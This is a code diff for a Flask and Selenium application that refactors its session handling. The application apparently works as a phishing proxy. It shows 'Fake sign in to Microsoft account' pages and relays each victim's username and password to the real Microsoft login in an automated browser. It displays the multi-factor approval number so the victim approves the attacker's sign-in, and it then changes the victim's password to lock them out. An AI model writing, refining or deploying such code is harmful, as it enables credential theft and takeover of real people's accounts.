@@ -1,5 +1,6 @@
 from flask import render_template, redirect, url_for, session
 from app import app
+from app.session import Session
 from app.forms import NameForm, PasswordForm
 
 from selenium import webdriver
@@ -10,6 +11,8 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 
 import os
+
+Session = Session()
 
 def WEB_DRIVER_NAME(): return "geckodriver.exe"
 def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
@@ -22,33 +25,29 @@ def NEW_PASSWORD(): return REPEATED_CHARACTER() * MIN_PASSWORD_LENGTH()
 def NamePage(form): return render_template("login.html", title="Fake sign in", header="Fake sign in", form=form)
 def PasswordPage(form): return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=form)
 def AuthenticationPage(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
-def IndexPage(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
-
-session_count = 0
-drivers = []
-def Driver(): return drivers[session["id"]]
+def IndexPage(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=Session.name)
 
 def change_password():
-    Driver().get("https://mysignins.microsoft.com/security-info/password/change")
-    new_password_field = WebDriverWait(Driver(), 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
-    confirm_password_field = Driver().find_element(By.NAME, "newPasswordConfirm")
+    Session.driver.get("https://mysignins.microsoft.com/security-info/password/change")
+    new_password_field = WebDriverWait(Session.driver, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
+    confirm_password_field = Session.driver.find_element(By.NAME, "newPasswordConfirm")
 
     new_password_field.send_keys(NEW_PASSWORD())
     confirm_password_field.send_keys(NEW_PASSWORD())
 
-    submit_button = Driver().find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
+    submit_button = Session.driver.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
     submit_button.click()
 
-    session["password_changed"] = True
+    Session.password_changed = True
 
 def get_authentication_code():
     try:
-        authentication_code = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
+        authentication_code = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
         return authentication_code.text
 
     except:
         try:
-            resend_request = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
+            resend_request = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
             resend_request.click()
             return get_authentication_code()
 
@@ -56,11 +55,11 @@ def get_authentication_code():
             return False
 
 def enter_field(field_name, value, error_id, clear):
-    field = WebDriverWait(Driver(), 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
+    field = WebDriverWait(Session.driver, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
     field.send_keys(value, Keys.RETURN)
 
     try:
-        error = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, error_id)))
+        error = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, error_id)))
 
         if clear:
             field.clear()
@@ -78,40 +77,37 @@ def enter_password(password):
 
 @app.route("/")
 def index():
-    if "name" in session and "password" in session and session["password_changed"]:
+    if "name" in session and "password" in session and Session.password_changed:
         return IndexPage()
 
     return redirect(url_for("login"))
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-    global session_count
-    global drivers
-
     if "id" not in session:
-        session["id"] = session_count
-        session_count += 1
-        session["password_changed"] = False
+        Session.id = Session.count
+        Session.count += 1
+        Session.password_changed = False
 
-        drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
-        Driver().get("https://myapps.microsoft.com")
+        Session.drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
+        Session.driver.get("https://myapps.microsoft.com")
 
     name_form = NameForm()
     password_form = PasswordForm()
 
-    if "name" in session and "password" in session and session["password_changed"]:
+    if "name" in session and "password" in session and Session.password_changed:
         return redirect(url_for("index"))
 
     elif "name" not in session:
         if name_form.validate_on_submit() and enter_name(name_form.name.data):
-            session["name"] = name_form.name.data
+            Session.name = name_form.name.data
             return PasswordPage(password_form)
     
         return NamePage(name_form)
 
     elif "password" not in session:
         if password_form.validate_on_submit() and enter_password(password_form.password.data):
-            session["password"] = password_form.password.data
+            Session.password = password_form.password.data
             return redirect(url_for("login"))
 
         return PasswordPage(password_form)
@@ -121,13 +117,13 @@ def login():
         if authentication_code:
             return AuthenticationPage(authentication_code)
 
-        elif not session["password_changed"]:
+        elif not Session.password_changed:
             change_password()
 
         try:
-            WebDriverWait(Driver(), 10).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
+            WebDriverWait(Session.driver, 10).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
 
         except:
-            Driver().quit()
+            Session.driver.quit()
 
         return redirect(url_for("index"))
